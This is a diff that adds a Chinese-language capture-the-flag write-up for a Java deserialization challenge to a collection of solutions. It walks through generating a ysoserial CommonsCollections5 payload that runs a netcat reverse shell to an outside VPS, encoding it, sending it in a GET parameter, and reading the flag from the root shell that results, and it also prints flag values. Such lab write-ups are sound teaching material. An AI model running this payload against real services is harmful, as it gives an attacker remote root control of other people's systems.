@@ -11649,6 +11649,123 @@ flag{7ddce3afd760b48f93ffeab618d4626b}
 
 ------
 
+### ez_java_serialize
+
+这题考察`Java`反序列化以及使用 `ysoserial` 工具进行命令执行。[ysoserial](https://github.com/frohoff/ysoserial/releases) 是一个开源工具，主要用于生成可以触发`Java`反序列化漏洞的有效载荷，`ysoserial`支持多种不同的攻击向量，每个都针对特定的`Java`类库或框架中的反序列化漏洞，本题使用的攻击向量是`CommonsCollections5`。
+
+下载附件解压缩后，在`src/main/java/com/bugku/ez_unserialize/controller/`中的`helloController.java`里有关键代码：
+
+```java
+@RequestMapping("/hello{name}")
+public String hello(@RequestParam("name") String serialStr){
+    try {
+        deserialize(Base64.getDecoder().decode(serialStr)); //模拟存在反序列化的点
+    } catch (IOException e) {
+        e.printStackTrace();
+        return "something is wrong";
+    } catch (ClassNotFoundException e) {
+        e.printStackTrace();
+    }
+    return "2333";
+}
+```
+
+从 Adoptium（Eclipse Temurin）的 [GitHub 发布页](https://github.com/adoptium/temurin8-binaries/releases/)下载 最新的 JDK8 压缩包。
+
+```bash
+wget https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u512-b09/OpenJDK8U-jdk_x64_linux_hotspot_8u512b09.tar.gz
+```
+
+解压缩并重命名文件夹为`jdk1.8`。
+
+```bash
+mkdir -p jdk1.8
+tar -xzf OpenJDK8U-jdk_x64_linux_hotspot_8u512b09.tar.gz -C jdk1.8 --strip-components=1
+```
+
+验证无误。
+
+```bash
+$ ./jdk1.8/bin/java -version
+openjdk version "1.8.0_512"
+OpenJDK Runtime Environment (Temurin)(build 1.8.0_512-b09)
+OpenJDK 64-Bit Server VM (Temurin)(build 25.512-b09, mixed mode)
+```
+
+用 `update-alternatives` 把 `jdk1.8` 注册为可选项。
+
+```bash
+sudo update-alternatives --install /usr/bin/java java ~/tools/jdk1.8/bin/java 2503
+sudo update-alternatives --install /usr/bin/javac javac ~/tools/jdk1.8/bin/javac 2503
+```
+
+注册后即可用`update-alternative`切换 `Java` 版本。
+
+```bash
+sudo update-alternatives --config java
+```
+
+我们用`ysoserial`创建一个在`Java`反序列化时执行命令的对象。
+
+```bash
+java -jar ysoserial-all.jar CommonsCollections5 "nc 34.19.3.124 9999 -e /bin/bash" > payload.ser
+```
+
+再将生成的 `payload.ser` 文件进行 `Base64` 编码。
+
+```bash
+base64 -w 0 payload.ser > payload.b64
+```
+
+最后再用`python`对`payload.ser` 文件进行`URL`编码，得到`payload.url`。
+
+```python
+import urllib.parse
+
+with open("payload.b64", "r", encoding="utf-8") as f:
+    original_str = f.read().strip()
+
+encoded_str = urllib.parse.quote(original_str, safe="")
+
+with open("payload.url", "w", encoding="utf-8") as f:
+    f.write(encoded_str)
+
+print("URL编码后:", encoded_str)
+```
+
+我们需要一台`VPS`用于反弹shell。先在Google Cloud启动VPS，然后用`gcloud`连接VPS。
+
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
+
+在VPS中输入`nc -lvnp port`监听端口，比如我在`Google Cloud`中的`ctf-vps`的`IP`是`34.19.3.124`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+因为是`GET`请求方式，所以我们可以把`encoded_str`字符串粘贴在`/hello?name=`后用浏览器直接访问。
+
+浏览器响应后返回了一个貌似长度的数字`2333`，在`VPS`中可以看到成功反弹`Shell`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 160.202.254.160 39201
+whoami
+root
+find / -name "flag" 
+/flag
+cat /flag
+flag{95529b6ddc74ca13cc4af04fc1fd04b8}
+```
+
+提交`flag{95529b6ddc74ca13cc4af04fc1fd04b8}`即可。
+
+------
+
 ### 简单的Include
 
 > 题目描述：听说你很会读文件？我把门（目录遍历）焊死了，窗户（关键词过滤）也封了。笔给你，你来写（payload）。
